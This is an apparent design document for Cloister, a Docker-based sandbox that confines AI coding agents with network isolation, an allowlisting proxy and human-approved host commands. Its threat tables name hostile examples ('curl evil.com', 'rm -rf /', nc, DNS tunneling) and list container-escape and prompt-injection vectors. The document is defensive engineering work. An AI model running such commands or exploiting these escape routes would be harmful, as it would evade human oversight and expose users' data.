# Cloister: AI Agent Sandboxing System

A sandboxing system for AI coding agents that prevents destructive AI actions during long-running, unsupervised operation. Supports any CLI-based AI agent with optional devcontainer integration.

## Goals

1. **Prevent unintentional destruction** — AI cannot accidentally delete files outside the project, corrupt system config, or interfere with other projects
2. **Block data exfiltration** — AI cannot send code, credentials, or sensitive data to external services
3. **Preserve development velocity** — Long-running AI sessions without permission interrupts; manual testing and git operations remain seamless
4. **Maintain flexibility** — Read-only access to reference materials; controlled escape hatch for package installation or other commands needing human approval
5. **Agent agnostic** — Support any CLI-based AI coding tool with consistent security guarantees
6. **Devcontainer compatible** — Leverage existing project devcontainer.json configurations while enforcing security boundaries
7. **Worktree native** — First-class support for git worktrees; project permissions apply uniformly across all worktrees

---

## Threat Model

Based on Simon Willison's "[Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)," the system must prevent the combination of private data access, untrusted content exposure, and external communications.

| Capability | Uncontrolled AI | Cloister Controlled AI |
|------------|-----------------|-----------------------------|
| Private data access | Full filesystem | Project dir only + explicit read-only refs |
| Untrusted content exposure | Arbitrary web | Allowlisted websites for documentation |
| External communication | Arbitrary unix commands | Request channel for human-approved unrestricted commands |

Cloister prioritizes preventing *unintentional* harm from a well-meaning but overeager AI running in "YOLO mode" with `--dangerously-skip-permissions` or equivalent configuration. Communication and command restrictions defend against naive prompt injection attacks that might attempt exfiltration, compromise, or sabotage.

---

## Sandboxing Philosophy: Scope Control vs Action Control

There are two broad approaches to sandboxing AI agents:

**Action Control** attempts to enumerate and restrict *what the agent can do*. Policies specify permitted and forbidden operations: which files can be opened, which executables can run, which system calls are allowed. This provides fine-grained control—you can allow reading a directory while forbidding writes, or permit one tool but forbid another.

The challenge with action control is *completeness*. There are many ways to achieve the same effect:

| Intent | Obvious Action | Alternative Actions |
|--------|----------------|---------------------|
| Delete file | `rm foo.txt` | `> foo.txt`, `truncate -s0`, `mv foo.txt /dev/null` |
| Exfiltrate data | `curl evil.com` | `wget`, `nc`, Python `urllib`, DNS tunneling |
| Corrupt config | Edit `~/.bashrc` | `sed -i`, symlink attack, environment manipulation |

The policy author must anticipate all mechanisms; the attacker (or misguided AI) only needs to find one that wasn't forbidden. Seeing a policy that forbids `rm` doesn't mean files are safe from deletion, but may give a false sense of safety.

**Scope Control** limits *where the agent can have effects* rather than *what actions it can take*. The sandbox defines boundaries, and within those boundaries, the agent has freedom:

- **Filesystem scope**: Only a designated directory is writable. The agent can `rm`, `truncate`, or corrupt anything—but only within a designated directory or ephemeral container filesystem.
- **Network scope**: Only allowlisted domains are reachable. The agent can attempt any exfiltration technique—but the packets have nowhere to go.
- **Host scope**: Privileged actions on the host require human intervention. The agent can request anything—but a human must approve it.

This accepts that enumerating all dangerous actions is intractable, and instead ensures that *whatever happens*, either blast radius is contained or a human has approved the risk.

**Cloister's Position**

Cloister focuses on **scope control**. The threat model (well-meaning but overeager AI, naive prompt injection) doesn't require distinguishing between `rm` and `truncate`—it requires ensuring that *however* the AI causes damage, that damage stays within the project directory and can be recovered via git.

This is analogous to the difference between:
- A detailed rulebook: "You may not punch, kick, bite, scratch, or use weapons"
- A padded room: "Do whatever you want; you can't hurt anything outside these walls"

The rulebook requires anticipating every harmful action. The padded room accepts that you can't anticipate everything, and limits consequences instead. This allows the agent great freedom to operate without permission checks that interrupt work.

Cloister also provides a hook for an AI to request exceptional actions that can only function at host scope. This is a narrow form of **action control**: by default all actions are denied.  Only requests that are well-formed against a list of pre-approved actions or are reviewed by a human may execute outside the controlled cloister enviroment.

---

## Concepts

### Project

A **project** is a local git repository directory. A project:

- Is uniquely named and associated with a filesystem path containing a git repository
- Named by directory basename (e.g., `~/repos/my-api` → `my-api`)
- Custom name via `start -p` flag if basename would collide with existing project
- Owns permission configuration (proxy allowlists, command patterns)
- May have cloister-managed worktrees under `~/.local/share/cloister/worktrees/<project>/`

Example: `~/repos/my-api` becomes project `my-api`. If `~/work/my-api` also exists, use `cloister start -p work-my-api` to create a distinct project.

### Worktree

A **worktree** is a directory containing a copy of the working tree of a repository:

- The **main checkout** (e.g., `~/repos/my-api`) is the original
- **Git worktrees** share the original's git store but have independent working directories
- Cloister-managed git worktrees live in `~/.local/share/cloister/worktrees/<project>/<branch>/`
- Worktrees are uniquely named within a project

Cloister-managed worktrees (via `start -b`) inherit project configuration.

Manually-created git worktrees (via `git worktree add` then `cloister start`) are treated as independent projects, named by their directory basename.

### Cloister

A **cloister** is a container session with a directory mounted at `/work`. Each cloister:

- Is associated with a single directory on the host
- Has a default name of `<project>` for main checkout or `<project>-<branch>` for worktrees (e.g., `my-api`, `my-api-feature-auth`)
- Inherits all permissions from its project
- Has its own audit log at `~/.local/share/cloister/logs/<cloister-name>.log`

### Non-Git Directories

Cloister can operate on non-git directories, but this degrades the safety model:

- No git history to recover from destructive changes
- No project identity for permission inheritance (uses directory name)
- Requires explicit `--allow-no-git` flag
- Displays prominent warning at startup

Users should prefer git-tracked projects. For throwaway experiments, consider initializing an empty git repo first.

---

## Architecture Overview

![Architecture Overview](diagrams/architecture-overview.svg) ([diagram source](diagrams/architecture-overview.d2))

### Key Insight: Separation of Concerns

| Activity | Where | Why |
|----------|-------|-----|
| AI code editing | Cloister container | Isolated from credentials, limited network |
| Manual editing | Host or human devcontainer | Full editor config, native performance |
| Git push | Host or human devcontainer | Full credential access limited to humans |
| Running dev servers | Host or human devcontainer | Normal network access |
| Package installation | Host (via request channel) or via proxy (if allowed) | Controlled access |

The cloister container and host share the project directory via bind mount. Changes from either side are immediately visible to the other.

---

## Supported AI Agents

Cloister is agent-agnostic. Any CLI tool that operates on local files can run inside a cloister.  Not all agents are supported yet. Future examples might include:

| Agent | Command | Config | Env Vars (if needed) |
|-------|---------|------------------|-----------------|
| Claude Code | `claude` | `~/.claude/`, `~/.claude.json` | `ANTHROPIC_*`, `CLAUDE_*` |
| OpenAI Codex | `codex` | `~/.codex/` | `OPENAI_API_KEY` |
| Google Gemini | `gemini` | `~/.config/gemini/` | `GOOGLE_API_KEY` |
| GitHub Copilot CLI | `github-copilot-cli` | `~/.config/gh/` | (via gh auth) |

The launcher configures the appropriate environment for the selected agent. For agents with their own permission systems (like Claude Code's `--dangerously-skip-permissions`), cloister disables restrictions — the cloister *is* the sandbox, making agent-level permission prompts redundant.

See [agent-configuration.md](agent-configuration.md) for detailed setup instructions for each agent.

---

## Components

Cloister consists of three components:

* **Cloister container images**: Runtime environments for AI agents (default image or devcontainer-based)
* **Guardian container**: Network gateway that handles proxy and approval services
* **Cloister binary**: A single Go binary (`cloister`) that manages everything. It runs in two modes:
    - Guardian host executor
    - CLI for user commands

### Cloister Container Images

Configurable containers with development tools, built from devcontainer.json or a default image. See [container-image.md](container-image.md) for the full Dockerfile and filesystem layout.

**Security Hardening:**

```bash
--cap-drop=ALL
--security-opt=no-new-privileges
--network cloister-net  # internal only
```

No access to Docker socket, host SSH keys (`~/.ssh`), cloud credentials (`~/.aws`, `~/.config/gcloud`), host config (`~/.config`, `~/.local`), or GPG keys (`~/.gnupg`).

### Guardian

The guardian is a hybrid of a container and a host process, working together:

**Guardian Container (`cloister-guardian`):**
- Runs on two networks: `cloister-net` (internal) and `bridge` (internet access)
- Cloisters reach it via Docker DNS on `cloister-net`
- Forwards approved proxy requests to the internet via `bridge`

**Host Process (`cloister` binary):**
- Listens on a Unix socket (`~/.local/share/cloister/hostexec.sock`)
- Executes approved host commands
- Socket is bind-mounted into the guardian container

This separation is necessary because:
1. Cloisters are on an `--internal` network with no route to the host
2. The guardian must be reachable from cloisters (requires being on `cloister-net`)
3. Host command execution requires running on the host (not possible from a container without Docker socket access)

| Service | Port | Binding | Purpose |
|---------|------|---------|---------|
| Proxy Server | 3128 | `cloister-net` | HTTP CONNECT proxy with domain allowlist |
| Request Server | 9998 | `cloister-net` | Command execution requests from hostexec |
| Approval Server | 9999 | `127.0.0.1` | Web UI for human review and approval |
| Host Executor | Unix socket | Host | Executes approved commands on host |

See [guardian-api.md](guardian-api.md) for full endpoint documentation.

**Domain approval flow for unlisted domains:**

1. Request arrives for domain not in allowlist
2. Proxy creates pending approval request with 60s timeout
3. Proxy holds connection open, waiting for approval
4. Human sees request in approval UI with options:
   - **Allow (session)** — in-memory only, expires when cloister stops
   - **Save to project** — persists to `~/.config/cloister/projects/<name>.yaml`
   - **Save to global** — persists to `~/.config/cloister/config.yaml`
   - **Deny** — reject this request
5. If approved: domain added to allowlist, request forwarded
6. If denied or timeout: return 403 with JSON error body

#### Internal Architecture

![Guardian Internal Architecture](diagrams/guardian-internal.svg) ([diagram source](diagrams/guardian-internal.d2))

### Cloister CLI Mode

The default mode provides commands for container lifecycle, projects, and worktrees. See [cli-workflows.md](cli-workflows.md) for full CLI reference and workflow examples.

```bash
# Quick reference
cloister start                    # Start/enter cloister for current directory
cloister start -p <name>          # Use custom project name
cloister start -b <branch>        # Create worktree + cloister for branch
cloister start -d                 # Start detached (enter from another terminal)
cloister list                     # Show running cloisters
cloister path <name>              # Get host path for cloister directory
cloister stop                     # Stop cloister for current directory
cloister stop <name>              # Stop specific cloister
cloister guardian start           # Start guardian (background)
cloister guardian stop            # Stop guardian
```

---

## File Structure

```
~/.config/cloister/
├── config.yaml                # Global configuration
├── projects/                  # Per-project configuration
│   ├── my-api.yaml
│   ├── frontend.yaml
│   └── shared-lib.yaml
└── tokens/                    # Active cloister tokens (survives guardian restart)
    ├── af3b2c1d...yaml        # Token file with cloister metadata
    └── b7e4f8a2...yaml

~/.local/share/cloister/
├── hostexec.sock              # Unix socket for host command execution
├── audit.log                  # Unified audit log
├── logs/                      # Per-cloister logs (named by cloister)
│   ├── my-api-main.log
│   ├── my-api-feature-auth.log
│   └── frontend-main.log
├── worktrees/                 # Cloister-managed worktrees
│   ├── my-api/
│   │   ├── feature-auth/      # git worktree for feature-auth branch
│   │   └── bugfix-123/        # git worktree for bugfix-123 branch
│   └── frontend/
│       └── redesign/
├── cache/                     # Built image cache
│   └── devcontainer-<hash>/
└── images/
    └── cloister.Dockerfile    # Default container image
```

---

## Devcontainer Integration

Cloister can use a project's existing `.devcontainer/devcontainer.json` to build the container image while enforcing security restrictions at runtime. Security overrides are always applied regardless of what the devcontainer.json requests.

See [devcontainer-integration.md](devcontainer-integration.md) for configuration discovery, security overrides, feature trust model, and example configurations.

---

## Configuration

Configuration is stored in `~/.config/cloister/`:
- `config.yaml` — Global settings (proxy allowlist, approval patterns, agent configs)
- `projects/<name>.yaml` — Per-project overrides (additional allowlists, refs)

See [config-reference.md](config-reference.md) for full schema documentation.

---

## Network Architecture

### Docker Network Setup

```bash
# Create internal network (no external access for cloisters)
docker network create --internal cloister-net

# Guardian is attached to both networks:
# - cloister-net: receives requests from cloisters
# - bridge: forwards proxy traffic to internet
docker network connect cloister-net cloister-guardian
docker network connect bridge cloister-guardian
```

The `--internal` flag on `cloister-net` prevents cloister containers from reaching external networks or the host directly. The guardian container bridges the gap: it receives requests on `cloister-net` and forwards approved traffic via `bridge`.

### Multi-Cloister Network Topology

![Network Topology](diagrams/network-topology.svg) ([diagram source](diagrams/network-topology.d2))

All cloisters share `cloister-net` and communicate through the guardian. The guardian authenticates requests using a per-cloister token (`CLOISTER_TOKEN`). This prevents one cloister from spoofing requests as another.

For host command execution, approved requests flow from the guardian container to the host process via a Unix socket (`hostexec.sock`), which is bind-mounted into the container.

**Token lifecycle:**
1. CLI generates a cryptographically random token (32 bytes, hex-encoded) when creating a cloister
2. Token is passed to the container via environment variable and registered with the guardian
3. Guardian persists token → cloister metadata to `~/.config/cloister/tokens/<token>.yaml`
4. Guardian loads all tokens from disk on startup, enabling restart without losing cloister associations
5. All requests must include the token:
   - Proxy requests use standard `Proxy-Authorization` header (token as password in Basic auth)
   - Hostexec requests use `X-Cloister-Token` header
6. Guardian uses the token as the authoritative identity, ignoring any claimed name in request bodies
7. When a cloister is destroyed (`cloister stop`), CLI calls DELETE /register/{token} and guardian removes the token file

For proxy requests, the token is provided via standard HTTP proxy authentication because the custom `X-Cloister-Token` header (used for hostexec) can't be configured for all the possible clients that might need it. The container environment includes:

```bash
HTTPS_PROXY=http://cloister:${CLOISTER_TOKEN}@cloister-guardian:3128/
HTTP_PROXY=http://cloister:${CLOISTER_TOKEN}@cloister-guardian:3128/
NO_PROXY=cloister-guardian,localhost,127.0.0.1
```

### DNS Resolution

Containers on `cloister-net` cannot reach external DNS servers due to the `--internal` flag. DNS resolution works as follows:

- **Container-to-guardian**: Docker's embedded DNS resolves `cloister-guardian` to the guardian's IP on `cloister-net`
- **External domains**: The HTTP CONNECT proxy receives hostnames (not IPs) and resolves them server-side before forwarding. Containers never perform external DNS lookups.
- **DNS exfiltration**: Blocked. Containers have no route to external DNS servers, and the guardian does not provide DNS service.

No special configuration is required. The `--internal` network topology inherently prevents DNS-based data exfiltration.

### Container Isolation

Containers on `cloister-net` can reach each other by IP but have no shared filesystems. Since cloisters run AI agents (not network services), cross-container communication poses no practical risk. Each cloister's project directory is isolated via separate bind mounts.

---

## Security Considerations

### Container Escape Vectors

| Vector | Risk | Mitigation |
|--------|------|------------|
| Kernel CVE | Low | Keep Docker updated |
| `--privileged` | Critical | Never used |
| Docker socket mount | Critical | Never mounted |
| Sensitive host paths | High | Explicitly blocked |
| Excessive capabilities | Medium | `--cap-drop=ALL` |
| Privilege escalation | Medium | `--no-new-privileges` |

### Network Exfiltration Vectors

| Vector | Risk | Mitigation |
|--------|------|------------|
| Direct connection | High | `--internal` network blocks all direct egress |
| Ignored HTTP_PROXY | High | No route exists except through proxy |
| DNS exfiltration | Medium | Proxy handles DNS; container can't reach external |
| Allowed domain abuse | Low | Doc sites don't accept arbitrary data |
| API endpoint abuse | Low | AI APIs have rate limits and logging |

### Prompt Injection Risks

| Attack | Impact | Mitigation |
|--------|--------|------------|
| "Run curl evil.com" | Blocked | Network isolation; not in allowlist |
| "Run rm -rf /" | Limited | Only /work writable; no host access |
| Malicious hostexec | Requires approval | Pattern validation + human review |
| Exfil via AI API | Low | Logged; provider ToS violations detectable |

### Cross-Cloister Spoofing

| Attack | Impact | Mitigation |
|--------|--------|------------|
| Forge token in proxy auth or header | Impersonation | Tokens are 256-bit crypto-random values |
| Read another cloister's token | Impersonation | Tokens are per-process env vars; requires container escape |
| Brute-force token | Impersonation | 256-bit tokens; computationally infeasible |

### Devcontainer-Specific Risks

| Risk | Mitigation |
|------|------------|
| Malicious feature | Feature allowlist; warn on unknown sources |
| Mount request for ~/.ssh | Blocked by override regardless of config |
| Lifecycle command exfiltration | Commands run via proxy with allowlist |
| Feature runs as root during build | Build phase has no secrets; image inspectable |

---

## Related Documentation

| Document | Contents |
|----------|----------|
| [cli-workflows.md](cli-workflows.md) | CLI commands and workflow examples |
| [guardian-api.md](guardian-api.md) | Guardian endpoint reference |
| [container-image.md](container-image.md) | Default Dockerfile and hostexec |
| [devcontainer-integration.md](devcontainer-integration.md) | Devcontainer security and configuration |
| [config-reference.md](config-reference.md) | Full configuration schema |
| [implementation-phases.md](implementation-phases.md) | Development roadmap |

